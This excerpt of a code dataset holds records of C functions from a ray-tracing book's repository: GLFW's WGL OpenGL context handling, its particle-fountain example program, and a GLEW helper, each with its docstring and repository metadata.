ctxconfig->minor);\n                }\n                else\n                {\n                    _glfwInputError(GLFW_VERSION_UNAVAILABLE,\n                                    \"WGL: Driver does not support OpenGL ES version %i.%i\",\n                                    ctxconfig->major,\n                                    ctxconfig->minor);\n                }\n            }\n            else if (error == (0xc0070000 | ERROR_INVALID_PROFILE_ARB))\n            {\n                _glfwInputError(GLFW_VERSION_UNAVAILABLE,\n                                \"WGL: Driver does not support the requested OpenGL profile\");\n            }\n            else\n            {\n                if (ctxconfig->client == GLFW_OPENGL_API)\n                {\n                    _glfwInputError(GLFW_VERSION_UNAVAILABLE,\n                                    \"WGL: Failed to create OpenGL context\");\n                }\n                else\n                {\n                    _glfwInputError(GLFW_VERSION_UNAVAILABLE,\n                                    \"WGL: Failed to create OpenGL ES context\");\n                }\n            }\n\n            return GLFW_FALSE;\n        }\n    }\n    else\n    {\n        window->context.wgl.handle = wglCreateContext(window->context.wgl.dc);\n        if (!window->context.wgl.handle)\n        {\n            _glfwInputError(GLFW_VERSION_UNAVAILABLE,\n                            \"WGL: Failed to create OpenGL context\");\n            return GLFW_FALSE;\n        }\n\n        if (share)\n        {\n            if (!wglShareLists(share, window->context.wgl.handle))\n            {\n                _glfwInputError(GLFW_PLATFORM_ERROR,\n                                \"WGL: Failed to enable sharing with specified OpenGL context\");\n                return GLFW_FALSE;\n            }\n        }\n    }\n\n    window->context.makeCurrent = makeContextCurrentWGL;\n    window->context.swapBuffers = swapBuffersWGL;\n    window->context.swapInterval = swapIntervalWGL;\n    window->context.extensionSupported = extensionSupportedWGL;\n    window->context.getProcAddress = getProcAddressWGL;\n    window->context.destroy = destroyContextWGL;\n\n    return GLFW_TRUE;\n}", "path": "ray-tracing-gems/Ch_29_Efficient_Particle_Volume_Splatting_in_a_Ray_Tracer/support/glfw/src/wgl_context.c", "commit_date": "2019-03-12 00:00:00", "repo_name": "Apress/ray-tracing-gems", "stars": 943, "license": "mit", "language": "c", "size": 140566}
{"docstring": "//========================================================================\n// Key callback functions\n//========================================================================\n", "func_signal": "static void key_callback(GLFWwindow* window, int key, int scancode, int action, int mods)", "code": "{\n    if (action == GLFW_PRESS)\n    {\n        switch (key)\n        {\n            case GLFW_KEY_ESCAPE:\n                glfwSetWindowShouldClose(window, GLFW_TRUE);\n                break;\n            case GLFW_KEY_W:\n                wireframe = !wireframe;\n                glPolygonMode(GL_FRONT_AND_BACK,\n                              wireframe ? GL_LINE : GL_FILL);\n                break;\n            default:\n                break;\n        }\n    }\n}", "path": "ray-tracing-gems/Ch_29_Efficient_Particle_Volume_Splatting_in_a_Ray_Tracer/support/glfw/examples/particles.c", "commit_date": "2019-03-12 00:00:00", "repo_name": "Apress/ray-tracing-gems", "stars": 943, "license": "mit", "language": "c", "size": 140566}
{"docstring": "// Initialize WGL\n//\n", "func_signal": "GLFWbool _glfwInitWGL(void)", "code": "{\n    if (_glfw.wgl.instance)\n        return GLFW_TRUE;\n\n    _glfw.wgl.instance = LoadLibraryA(\"opengl32.dll\");\n    if (!_glfw.wgl.instance)\n    {\n        _glfwInputError(GLFW_PLATFORM_ERROR, \"WGL: Failed to load opengl32.dll\");\n        return GLFW_FALSE;\n    }\n\n    _glfw.wgl.CreateContext = (WGLCREATECONTEXT_T)\n        GetProcAddress(_glfw.wgl.instance, \"wglCreateContext\");\n    _glfw.wgl.DeleteContext = (WGLDELETECONTEXT_T)\n        GetProcAddress(_glfw.wgl.instance, \"wglDeleteContext\");\n    _glfw.wgl.GetProcAddress = (WGLGETPROCADDRESS_T)\n        GetProcAddress(_glfw.wgl.instance, \"wglGetProcAddress\");\n    _glfw.wgl.GetCurrentDC = (WGLGETCURRENTDC_T)\n        GetProcAddress(_glfw.wgl.instance, \"wglGetCurrentDC\");\n    _glfw.wgl.MakeCurrent = (WGLMAKECURRENT_T)\n        GetProcAddress(_glfw.wgl.instance, \"wglMakeCurrent\");\n    _glfw.wgl.ShareLists = (WGLSHARELISTS_T)\n        GetProcAddress(_glfw.wgl.instance, \"wglShareLists\");\n\n    return GLFW_TRUE;\n}", "path": "ray-tracing-gems/Ch_29_Efficient_Particle_Volume_Splatting_in_a_Ray_Tracer/support/glfw/src/wgl_context.c", "commit_date": "2019-03-12 00:00:00", "repo_name": "Apress/ray-tracing-gems", "stars": 943, "license": "mit", "language": "c", "size": 140566}
{"docstring": "// Number of vertices per particle\n", "func_signal": "static void draw_particles(GLFWwindow* window, double t, float dt)", "code": "{\n    int i, particle_count;\n    Vertex vertex_array[BATCH_PARTICLES * PARTICLE_VERTS];\n    Vertex* vptr;\n    float alpha;\n    GLuint rgba;\n    Vec3 quad_lower_left, quad_lower_right;\n    GLfloat mat[16];\n    PARTICLE* pptr;\n\n    // Here comes the real trick with flat single primitive objects (s.c.\n    // \"billboards\"): We must rotate the textured primitive so that it\n    // always faces the viewer (is coplanar with the view-plane).\n    // We:\n    //   1) Create the primitive around origo (0,0,0)\n    //   2) Rotate it so that it is coplanar with the view plane\n    //   3) Translate it according to the particle position\n    // Note that 1) and 2) is the same for all particles (done only once).\n\n    // Get modelview matrix. We will only use the upper left 3x3 part of\n    // the matrix, which represents the rotation.\n    glGetFloatv(GL_MODELVIEW_MATRIX, mat);\n\n    // 1) & 2) We do it in one swift step:\n    // Although not obvious, the following six lines represent two matrix/\n    // vector multiplications. The matrix is the inverse 3x3 rotation\n    // matrix (i.e. the transpose of the same matrix), and the two vectors\n    // represent the lower left corner of the quad, PARTICLE_SIZE/2 *\n    // (-1,-1,0), and the lower right corner, PARTICLE_SIZE/2 * (1,-1,0).\n    // The upper left/right corners of the quad is always the negative of\n    // the opposite corners (regardless of rotation).\n    quad_lower_left.x = (-PARTICLE_SIZE / 2) * (mat[0] + mat[1]);\n    quad_lower_left.y = (-PARTICLE_SIZE / 2) * (mat[4] + mat[5]);\n    quad_lower_left.z = (-PARTICLE_SIZE / 2) * (mat[8] + mat[9]);\n    quad_lower_right.x = (PARTICLE_SIZE / 2) * (mat[0] - mat[1]);\n    quad_lower_right.y = (PARTICLE_SIZE / 2) * (mat[4] - mat[5]);\n    quad_lower_right.z = (PARTICLE_SIZE / 2) * (mat[8] - mat[9]);\n\n    // Don't update z-buffer, since all particles are transparent!\n    glDepthMask(GL_FALSE);\n\n    glEnable(GL_BLEND);\n    glBlendFunc(GL_SRC_ALPHA, GL_ONE);\n\n    // Select particle texture\n    if (!wireframe)\n    {\n        glEnable(GL_TEXTURE_2D);\n        glBindTexture(GL_TEXTURE_2D, particle_tex_id);\n    }\n\n    // Set up vertex arrays. We use interleaved arrays, which is easier to\n    // handle (in most situations) and it gives a linear memeory access\n    // access pattern (which may give better performance in some\n    // situations). GL_T2F_C4UB_V3F means: 2 floats for texture coords,\n    // 4 ubytes for color and 3 floats for vertex coord (in that order).\n    // Most OpenGL cards / drivers are optimized for this format.\n    glInterleavedArrays(GL_T2F_C4UB_V3F, 0, vertex_array);\n\n    // Wait for particle physics thread to be done\n    mtx_lock(&thread_sync.particles_lock);\n    while (!glfwWindowShouldClose(window) &&\n            thread_sync.p_frame <= thread_sync.d_frame)\n    {\n        struct timespec ts;\n        clock_gettime(CLOCK_REALTIME, &ts);\n        ts.tv_nsec += 100000000;\n        cnd_timedwait(&thread_sync.p_done, &thread_sync.particles_lock, &ts);\n    }\n\n    // Store the frame time and delta time for the physics thread\n    thread_sync.t = t;\n    thread_sync.dt = dt;\n\n    // Update frame counter\n    thread_sync.d_frame++;\n\n    // Loop through all particles and build vertex arrays.\n    particle_count = 0;\n    vptr = vertex_array;\n    pptr = particles;\n\n    for (i = 0;  i < MAX_PARTICLES;  i++)\n    {\n        if (pptr->active)\n        {\n            // Calculate particle intensity (we set it to max during 75%\n            // of its life, then it fades out)\n            alpha =  4.f * pptr->life;\n            if (alpha > 1.f)\n                alpha = 1.f;\n\n            // Convert color from float to 8-bit (store it in a 32-bit\n            // integer using endian independent type casting)\n            ((GLubyte*) &rgba)[0] = (GLubyte)(pptr->r * 255.f);\n            ((GLubyte*) &rgba)[1] = (GLubyte)(pptr->g * 255.f);\n            ((GLubyte*) &rgba)[2] = (GLubyte)(pptr->b * 255.f);\n            ((GLubyte*) &rgba)[3] = (GLubyte)(alpha * 255.f);\n\n            // 3) Translate the quad to the correct position in modelview\n            // space and store its parameters in vertex arrays (we also\n            // store texture coord and color information for each vertex).\n\n            // Lower left corner\n            vptr->s    = 0.f;\n            vptr->t    = 0.f;\n            vptr->rgba = rgba;\n            vptr->x    = pptr->x + quad_lower_left.x;\n            vptr->y    = pptr->y + quad_lower_left.y;\n            vptr->z    = pptr->z + quad_lower_left.z;\n            vptr ++;\n\n            // Lower right corner\n            vptr->s    = 1.f;\n            vptr->t    = 0.f;\n            vptr->rgba = rgba;\n            vptr->x    = pptr->x + quad_lower_right.x;\n            vptr->y    = pptr->y + quad_lower_right.y;\n            vptr->z    = pptr->z + quad_lower_right.z;\n            vptr ++;\n\n            // Upper right corner\n            vptr->s    = 1.f;\n            vptr->t    = 1.f;\n            vptr->rgba = rgba;\n            vptr->x    = pptr->x - quad_lower_left.x;\n            vptr->y    = pptr->y - quad_lower_left.y;\n            vptr->z    = pptr->z - quad_lower_left.z;\n            vptr ++;\n\n            // Upper left corner\n            vptr->s    = 0.f;\n            vptr->t    = 1.f;\n            vptr->rgba = rgba;\n            vptr->x    = pptr->x - quad_lower_right.x;\n            vptr->y    = pptr->y - quad_lower_right.y;\n            vptr->z    = pptr->z - quad_lower_right.z;\n            vptr ++;\n\n            // Increase count of drawable particles\n            particle_count ++;\n        }\n\n        // If we have filled up one batch of particles, draw it as a set\n        // of quads using glDrawArrays.\n        if (particle_count >= BATCH_PARTICLES)\n        {\n            // The first argument tells which primitive type we use (QUAD)\n            // The second argument tells the index of the first vertex (0)\n            // The last argument is the vertex count\n            glDrawArrays(GL_QUADS, 0, PARTICLE_VERTS * particle_count);\n            particle_count = 0;\n            vptr = vertex_array;\n        }\n\n        // Next particle\n        pptr++;\n    }\n\n    // We are done with the particle data\n    mtx_unlock(&thread_sync.particles_lock);\n    cnd_signal(&thread_sync.d_done);\n\n    // Draw final batch of particles (if any)\n    glDrawArrays(GL_QUADS, 0, PARTICLE_VERTS * particle_count);\n\n    // Disable vertex arrays (Note: glInterleavedArrays implicitly called\n    // glEnableClientState for vertex, texture coord and color arrays)\n    glDisableClientState(GL_VERTEX_ARRAY);\n    glDisableClientState(GL_TEXTURE_COORD_ARRAY);\n    glDisableClientState(GL_COLOR_ARRAY);\n\n    glDisable(GL_TEXTURE_2D);\n    glDisable(GL_BLEND);\n\n    glDepthMask(GL_TRUE);\n}", "path": "ray-tracing-gems/Ch_29_Efficient_Particle_Volume_Splatting_in_a_Ray_Tracer/support/glfw/examples/particles.c", "commit_date": "2019-03-12 00:00:00", "repo_name": "Apress/ray-tracing-gems", "stars": 943, "license": "mit", "language": "c", "size": 140566}
{"docstring": "//========================================================================\n// Recursive function for building variable tesselated floor\n//========================================================================\n", "func_signal": "static void tessellate_floor(float x1, float y1, float x2, float y2, int depth)", "code": "{\n    float delta, x, y;\n\n    // Last recursion?\n    if (depth >= 5)\n        delta = 999999.f;\n    else\n    {\n        x = (float) (fabs(x1) < fabs(x2) ? fabs(x1) : fabs(x2));\n        y = (float) (fabs(y1) < fabs(y2) ? fabs(y1) : fabs(y2));\n        delta = x*x + y*y;\n    }\n\n    // Recurse further?\n    if (delta < 0.1f)\n    {\n        x = (x1 + x2) * 0.5f;\n        y = (y1 + y2) * 0.5f;\n        tessellate_floor(x1, y1,  x,  y, depth + 1);\n        tessellate_floor(x, y1, x2,  y, depth + 1);\n        tessellate_floor(x1,  y,  x, y2, depth + 1);\n        tessellate_floor(x,  y, x2, y2, depth + 1);\n    }\n    else\n    {\n        glTexCoord2f(x1 * 30.f, y1 * 30.f);\n        glVertex3f(  x1 * 80.f, y1 * 80.f, 0.f);\n        glTexCoord2f(x2 * 30.f, y1 * 30.f);\n        glVertex3f(  x2 * 80.f, y1 * 80.f, 0.f);\n        glTexCoord2f(x2 * 30.f, y2 * 30.f);\n        glVertex3f(  x2 * 80.f, y2 * 80.f, 0.f);\n        glTexCoord2f(x1 * 30.f, y2 * 30.f);\n        glVertex3f(  x1 * 80.f, y2 * 80.f, 0.f);\n    }\n}", "path": "ray-tracing-gems/Ch_29_Efficient_Particle_Volume_Splatting_in_a_Ray_Tracer/support/glfw/examples/particles.c", "commit_date": "2019-03-12 00:00:00", "repo_name": "Apress/ray-tracing-gems", "stars": 943, "license": "mit", "language": "c", "size": 140566}
{"docstring": "/*\n * GLEW, just like OpenGL or GLU, does not rely on the standard C library.\n * These functions implement the functionality required in this file.\n */\n", "func_signal": "static GLuint _glewStrLen (const GLubyte* s)", "code": "{\n  GLuint i=0;\n  if (s == NULL) return 0;\n  while (s[i] != '\\0') i++;\n  return i;\n}", "path": "ray-tracing-gems/Ch_29_Efficient_Particle_Volume_Splatting_in_a_Ray_Tracer/sutil/glew.c", "commit_date": "2019-03-12 00:00:00", "repo_name": "Apress/ray-tracing-gems", "stars": 943, "license": "mit", "language": "c", "size": 140566}
{"docstring": "// Returns the specified attribute of the specified pixel format\n//\n", "func_signal": "static int getPixelFormatAttrib(_GLFWwindow* window, int pixelFormat, int attrib)", "code": "{\n    int value = 0;\n\n    assert(_glfw.wgl.ARB_pixel_format);\n\n    if (!_glfw.wgl.GetPixelFormatAttribivARB(window->context.wgl.dc,\n                                             pixelFormat,\n                                             0, 1, &attrib, &value))\n    {\n        _glfwInputError(GLFW_PLATFORM_ERROR,\n                        \"WGL: Failed to retrieve pixel format attribute %i\",\n                        attrib);\n        return 0;\n    }\n\n    return value;\n}", "path": "ray-tracing-gems/Ch_29_Efficient_Particle_Volume_Splatting_in_a_Ray_Tracer/support/glfw/src/wgl_context.c", "commit_date": "2019-03-12 00:00:00", "repo_name": "Apress/ray-tracing-gems", "stars": 943, "license": "mit", "language": "c", "size": 140566}
{"docstring": "//========================================================================\n// main\n//========================================================================\n", "func_signal": "int main(int argc, char** argv)", "code": "{\n    int ch, width, height;\n    thrd_t physics_thread = 0;\n    GLFWwindow* window;\n    GLFWmonitor* monitor = NULL;\n\n    if (!glfwInit())\n    {\n        fprintf(stderr, \"Failed to initialize GLFW\\n\");\n        exit(EXIT_FAILURE);\n    }\n\n    while ((ch = getopt(argc, argv, \"fh\")) != -1)\n    {\n        switch (ch)\n        {\n            case 'f':\n                monitor = glfwGetPrimaryMonitor();\n                break;\n            case 'h':\n                usage();\n                exit(EXIT_SUCCESS);\n        }\n    }\n\n    if (monitor)\n    {\n        const GLFWvidmode* mode = glfwGetVideoMode(monitor);\n\n        glfwWindowHint(GLFW_RED_BITS, mode->redBits);\n        glfwWindowHint(GLFW_GREEN_BITS, mode->greenBits);\n        glfwWindowHint(GLFW_BLUE_BITS, mode->blueBits);\n        glfwWindowHint(GLFW_REFRESH_RATE, mode->refreshRate);\n\n        width  = mode->width;\n        height = mode->height;\n    }\n    else\n    {\n        width  = 640;\n        height = 480;\n    }\n\n    window = glfwCreateWindow(width, height, \"Particle Engine\", monitor, NULL);\n    if (!window)\n    {\n        fprintf(stderr, \"Failed to create GLFW window\\n\");\n        glfwTerminate();\n        exit(EXIT_FAILURE);\n    }\n\n    if (monitor)\n        glfwSetInputMode(window, GLFW_CURSOR, GLFW_CURSOR_DISABLED);\n\n    glfwMakeContextCurrent(window);\n    gladLoadGLLoader((GLADloadproc) glfwGetProcAddress);\n    glfwSwapInterval(1);\n\n    glfwSetFramebufferSizeCallback(window, resize_callback);\n    glfwSetKeyCallback(window, key_callback);\n\n    // Set initial aspect ratio\n    glfwGetFramebufferSize(window, &width, &height);\n    resize_callback(window, width, height);\n\n    // Upload particle texture\n    glGenTextures(1, &particle_tex_id);\n    glBindTexture(GL_TEXTURE_2D, particle_tex_id);\n    glPixelStorei(GL_UNPACK_ALIGNMENT, 1);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);\n    glTexImage2D(GL_TEXTURE_2D, 0, GL_LUMINANCE, P_TEX_WIDTH, P_TEX_HEIGHT,\n                 0, GL_LUMINANCE, GL_UNSIGNED_BYTE, particle_texture);\n\n    // Upload floor texture\n    glGenTextures(1, &floor_tex_id);\n    glBindTexture(GL_TEXTURE_2D, floor_tex_id);\n    glPixelStorei(GL_UNPACK_ALIGNMENT, 1);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);\n    glTexImage2D(GL_TEXTURE_2D, 0, GL_LUMINANCE, F_TEX_WIDTH, F_TEX_HEIGHT,\n                 0, GL_LUMINANCE, GL_UNSIGNED_BYTE, floor_texture);\n\n    if (glfwExtensionSupported(\"GL_EXT_separate_specular_color\"))\n    {\n        glLightModeli(GL_LIGHT_MODEL_COLOR_CONTROL_EXT,\n                      GL_SEPARATE_SPECULAR_COLOR_EXT);\n    }\n\n    // Set filled polygon mode as default (not wireframe)\n    glPolygonMode(GL_FRONT_AND_BACK, GL_FILL);\n    wireframe = 0;\n\n    // Set initial times\n    thread_sync.t  = 0.0;\n    thread_sync.dt = 0.001f;\n    thread_sync.p_frame = 0;\n    thread_sync.d_frame = 0;\n\n    mtx_init(&thread_sync.particles_lock, mtx_timed);\n    cnd_init(&thread_sync.p_done);\n    cnd_init(&thread_sync.d_done);\n\n    if (thrd_create(&physics_thread, physics_thread_main, window) != thrd_success)\n    {\n        glfwTerminate();\n        exit(EXIT_FAILURE);\n    }\n\n    glfwSetTime(0.0);\n\n    while (!glfwWindowShouldClose(window))\n    {\n        draw_scene(window, glfwGetTime());\n\n        glfwSwapBuffers(window);\n        glfwPollEvents();\n    }\n\n    thrd_join(physics_thread, NULL);\n\n    glfwDestroyWindow(window);\n    glfwTerminate();\n\n    exit(EXIT_SUCCESS);\n}", "path": "ray-tracing-gems/Ch_29_Efficient_Particle_Volume_Splatting_in_a_Ray_Tracer/support/glfw/examples/particles.c", "commit_date": "2019-03-12 00:00:00", "repo_name": "Apress/ray-tracing-gems", "stars": 943, "license": "mit", "language": "c", "size": 140566}
{"docstring": "//========================================================================\n// Initialize a new particle\n//========================================================================\n", "func_signal": "static void init_particle(PARTICLE *p, double t)", "code": "{\n    float xy_angle, velocity;\n\n    // Start position of particle is at the fountain blow-out\n    p->x = 0.f;\n    p->y = 0.f;\n    p->z = FOUNTAIN_HEIGHT;\n\n    // Start velocity is up (Z)...\n    p->vz = 0.7f + (0.3f / 4096.f) * (float) (rand() & 4095);\n\n    // ...and a randomly chosen X/Y direction\n    xy_angle = (2.f * (float) M_PI / 4096.f) * (float) (rand() & 4095);\n    p->vx = 0.4f * (float) cos(xy_angle);\n    p->vy = 0.4f * (float) sin(xy_angle);\n\n    // Scale velocity vector according to a time-varying velocity\n    velocity = VELOCITY * (0.8f + 0.1f * (float) (sin(0.5 * t) + sin(1.31 * t)));\n    p->vx *= velocity;\n    p->vy *= velocity;\n    p->vz *= velocity;\n\n    // Color is time-varying\n    p->r = 0.7f + 0.3f * (float) sin(0.34 * t + 0.1);\n    p->g = 0.6f + 0.4f * (float) sin(0.63 * t + 1.1);\n    p->b = 0.6f + 0.4f * (float) sin(0.91 * t + 2.1);\n\n    // Store settings for fountain glow lighting\n    glow_pos[0] = 0.4f * (float) sin(1.34 * t);\n    glow_pos[1] = 0.4f * (float) sin(3.11 * t);\n    glow_pos[2] = FOUNTAIN_HEIGHT + 1.f;\n    glow_pos[3] = 1.f;\n    glow_color[0] = p->r;\n    glow_color[1] = p->g;\n    glow_color[2] = p->b;\n    glow_color[3] = 1.f;\n\n    // The particle is new-born and active\n    p->life = 1.f;\n    p->active = 1;\n}", "path": "ray-tracing-gems/Ch_29_Efficient_Particle_Volume_Splatting_in_a_Ray_Tracer/support/glfw/examples/particles.c", "commit_date": "2019-03-12 00:00:00", "repo_name": "Apress/ray-tracing-gems", "stars": 943, "license": "mit", "language": "c", "size": 140566}
{"docstring": "//========================================================================\n// Draw a fountain\n//========================================================================\n", "func_signal": "static void draw_fountain(void)", "code": "{\n    static GLuint fountain_list = 0;\n    double angle;\n    float  x, y;\n    int m, n;\n\n    // The first time, we build the fountain display list\n    if (!fountain_list)\n    {\n        fountain_list = glGenLists(1);\n        glNewList(fountain_list, GL_COMPILE_AND_EXECUTE);\n\n        glMaterialfv(GL_FRONT, GL_DIFFUSE, fountain_diffuse);\n        glMaterialfv(GL_FRONT, GL_SPECULAR, fountain_specular);\n        glMaterialf(GL_FRONT, GL_SHININESS, fountain_shininess);\n\n        // Build fountain using triangle strips\n        for (n = 0;  n < FOUNTAIN_SIDE_POINTS - 1;  n++)\n        {\n            glBegin(GL_TRIANGLE_STRIP);\n            for (m = 0;  m <= FOUNTAIN_SWEEP_STEPS;  m++)\n            {\n                angle = (double) m * (2.0 * M_PI / (double) FOUNTAIN_SWEEP_STEPS);\n                x = (float) cos(angle);\n                y = (float) sin(angle);\n\n                // Draw triangle strip\n                glNormal3f(x * fountain_normal[n * 2 + 2],\n                           y * fountain_normal[n * 2 + 2],\n                           fountain_normal[n * 2 + 3]);\n                glVertex3f(x * fountain_side[n * 2 + 2],\n                           y * fountain_side[n * 2 + 2],\n                           fountain_side[n * 2 +3 ]);\n                glNormal3f(x * fountain_normal[n * 2],\n                           y * fountain_normal[n * 2],\n                           fountain_normal[n * 2 + 1]);\n                glVertex3f(x * fountain_side[n * 2],\n                           y * fountain_side[n * 2],\n                           fountain_side[n * 2 + 1]);\n            }\n\n            glEnd();\n        }\n\n        glEndList();\n    }\n    else\n        glCallList(fountain_list);\n}", "path": "ray-tracing-gems/Ch_29_Efficient_Particle_Volume_Splatting_in_a_Ray_Tracer/support/glfw/examples/particles.c", "commit_date": "2019-03-12 00:00:00", "repo_name": "Apress/ray-tracing-gems", "stars": 943, "license": "mit", "language": "c", "size": 140566}
{"docstring": "//========================================================================\n// The main frame for the particle engine. Called once per frame.\n//========================================================================\n", "func_signal": "static void particle_engine(double t, float dt)", "code": "{\n    int i;\n    float dt2;\n\n    // Update particles (iterated several times per frame if dt is too large)\n    while (dt > 0.f)\n    {\n        // Calculate delta time for this iteration\n        dt2 = dt < MIN_DELTA_T ? dt : MIN_DELTA_T;\n\n        for (i = 0;  i < MAX_PARTICLES;  i++)\n            update_particle(&particles[i], dt2);\n\n        min_age += dt2;\n\n        // Should we create any new particle(s)?\n        while (min_age >= BIRTH_INTERVAL)\n        {\n            min_age -= BIRTH_INTERVAL;\n\n            // Find a dead particle to replace with a new one\n            for (i = 0;  i < MAX_PARTICLES;  i++)\n            {\n                if (!particles[i].active)\n                {\n                    init_particle(&particles[i], t + min_age);\n                    update_particle(&particles[i], min_age);\n                    break;\n                }\n            }\n        }\n\n        dt -= dt2;\n    }\n}", "path": "ray-tracing-gems/Ch_29_Efficient_Particle_Volume_Splatting_in_a_Ray_Tracer/support/glfw/examples/particles.c", "commit_date": "2019-03-12 00:00:00", "repo_name": "Apress/ray-tracing-gems", "stars": 943, "license": "mit", "language": "c", "size": 140566}
{"docstring": "// Return a list of available and usable framebuffer configs\n//\n", "func_signal": "static int choosePixelFormat(_GLFWwindow* window, const _GLFWfbconfig* desired)", "code": "{\n    _GLFWfbconfig* usableConfigs;\n    const _GLFWfbconfig* closest;\n    int i, pixelFormat, nativeCount, usableCount;\n\n    if (_glfw.wgl.ARB_pixel_format)\n    {\n        nativeCount = getPixelFormatAttrib(window,\n                                           1,\n                                           WGL_NUMBER_PIXEL_FORMATS_ARB);\n    }\n    else\n    {\n        nativeCount = DescribePixelFormat(window->context.wgl.dc,\n                                          1,\n                                          sizeof(PIXELFORMATDESCRIPTOR),\n                                          NULL);\n    }\n\n    usableConfigs = calloc(nativeCount, sizeof(_GLFWfbconfig));\n    usableCount = 0;\n\n    for (i = 0;  i < nativeCount;  i++)\n    {\n        const int n = i + 1;\n        _GLFWfbconfig* u = usableConfigs + usableCount;\n\n        if (_glfw.wgl.ARB_pixel_format)\n        {\n            // Get pixel format attributes through \"modern\" extension\n\n            if (!getPixelFormatAttrib(window, n, WGL_SUPPORT_OPENGL_ARB) ||\n                !getPixelFormatAttrib(window, n, WGL_DRAW_TO_WINDOW_ARB))\n            {\n                continue;\n            }\n\n            if (getPixelFormatAttrib(window, n, WGL_PIXEL_TYPE_ARB) !=\n                WGL_TYPE_RGBA_ARB)\n            {\n                continue;\n            }\n\n            if (getPixelFormatAttrib(window, n, WGL_ACCELERATION_ARB) ==\n                 WGL_NO_ACCELERATION_ARB)\n            {\n                continue;\n            }\n\n            u->redBits = getPixelFormatAttrib(window, n, WGL_RED_BITS_ARB);\n            u->greenBits = getPixelFormatAttrib(window, n, WGL_GREEN_BITS_ARB);\n            u->blueBits = getPixelFormatAttrib(window, n, WGL_BLUE_BITS_ARB);\n            u->alphaBits = getPixelFormatAttrib(window, n, WGL_ALPHA_BITS_ARB);\n\n            u->depthBits = getPixelFormatAttrib(window, n, WGL_DEPTH_BITS_ARB);\n            u->stencilBits = getPixelFormatAttrib(window, n, WGL_STENCIL_BITS_ARB);\n\n            u->accumRedBits = getPixelFormatAttrib(window, n, WGL_ACCUM_RED_BITS_ARB);\n            u->accumGreenBits = getPixelFormatAttrib(window, n, WGL_ACCUM_GREEN_BITS_ARB);\n            u->accumBlueBits = getPixelFormatAttrib(window, n, WGL_ACCUM_BLUE_BITS_ARB);\n            u->accumAlphaBits = getPixelFormatAttrib(window, n, WGL_ACCUM_ALPHA_BITS_ARB);\n\n            u->auxBuffers = getPixelFormatAttrib(window, n, WGL_AUX_BUFFERS_ARB);\n\n            if (getPixelFormatAttrib(window, n, WGL_STEREO_ARB))\n                u->stereo = GLFW_TRUE;\n            if (getPixelFormatAttrib(window, n, WGL_DOUBLE_BUFFER_ARB))\n                u->doublebuffer = GLFW_TRUE;\n\n            if (_glfw.wgl.ARB_multisample)\n                u->samples = getPixelFormatAttrib(window, n, WGL_SAMPLES_ARB);\n\n            if (_glfw.wgl.ARB_framebuffer_sRGB ||\n                _glfw.wgl.EXT_framebuffer_sRGB)\n            {\n                if (getPixelFormatAttrib(window, n, WGL_FRAMEBUFFER_SRGB_CAPABLE_ARB))\n                    u->sRGB = GLFW_TRUE;\n            }\n        }\n        else\n        {\n            PIXELFORMATDESCRIPTOR pfd;\n\n            // Get pixel format attributes through legacy PFDs\n\n            if (!DescribePixelFormat(window->context.wgl.dc,\n                                     n,\n                                     sizeof(PIXELFORMATDESCRIPTOR),\n                                     &pfd))\n            {\n                continue;\n            }\n\n            if (!(pfd.dwFlags & PFD_DRAW_TO_WINDOW) ||\n                !(pfd.dwFlags & PFD_SUPPORT_OPENGL))\n            {\n                continue;\n            }\n\n            if (!(pfd.dwFlags & PFD_GENERIC_ACCELERATED) &&\n                (pfd.dwFlags & PFD_GENERIC_FORMAT))\n            {\n                continue;\n            }\n\n            if (pfd.iPixelType != PFD_TYPE_RGBA)\n                continue;\n\n            u->redBits = pfd.cRedBits;\n            u->greenBits = pfd.cGreenBits;\n            u->blueBits = pfd.cBlueBits;\n            u->alphaBits = pfd.cAlphaBits;\n\n            u->depthBits = pfd.cDepthBits;\n            u->stencilBits = pfd.cStencilBits;\n\n            u->accumRedBits = pfd.cAccumRedBits;\n            u->accumGreenBits = pfd.cAccumGreenBits;\n            u->accumBlueBits = pfd.cAccumBlueBits;\n            u->accumAlphaBits = pfd.cAccumAlphaBits;\n\n            u->auxBuffers = pfd.cAuxBuffers;\n\n            if (pfd.dwFlags & PFD_STEREO)\n                u->stereo = GLFW_TRUE;\n            if (pfd.dwFlags & PFD_DOUBLEBUFFER)\n                u->doublebuffer = GLFW_TRUE;\n        }\n\n        u->handle = n;\n        usableCount++;\n    }\n\n    if (!usableCount)\n    {\n        _glfwInputError(GLFW_API_UNAVAILABLE,\n                        \"WGL: The driver does not appear to support OpenGL\");\n\n        free(usableConfigs);\n        return 0;\n    }\n\n    closest = _glfwChooseFBConfig(desired, usableConfigs, usableCount);\n    if (!closest)\n    {\n        _glfwInputError(GLFW_FORMAT_UNAVAILABLE,\n                        \"WGL: Failed to find a suitable pixel format\");\n\n        free(usableConfigs);\n        return 0;\n    }\n\n    pixelFormat = (int) closest->handle;\n    free(usableConfigs);\n\n    return pixelFormat;\n}", "path": "ray-tracing-gems/Ch_29_Efficient_Particle_Volume_Splatting_in_a_Ray_Tracer/support/glfw/src/wgl_context.c", "commit_date": "2019-03-12 00:00:00", "repo_name": "Apress/ray-tracing-gems", "stars": 943, "license": "mit", "language": "c", "size": 140566}
